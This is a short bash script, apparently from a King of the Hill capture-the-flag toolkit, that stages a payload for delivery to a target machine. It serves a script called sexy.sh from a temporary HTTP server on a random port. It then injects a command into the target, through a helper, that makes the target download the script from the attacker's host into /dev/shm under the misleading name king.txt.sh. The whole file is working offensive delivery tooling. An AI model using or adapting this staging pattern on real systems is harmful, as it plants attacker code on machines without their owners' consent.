#!/bin/bash

source "/root/git/koth/scripts/functions.sh"

PORT=$(($RANDOM+3000))
TMPDIR=$(mktemp -d)

hide_guake

cp /root/git/koth/scripts/sexy.sh $TMPDIR
cd $TMPDIR

python3 -m http.server $PORT &
command "wget $IP:$PORT/sexy.sh -O /dev/shm/king.txt.sh"
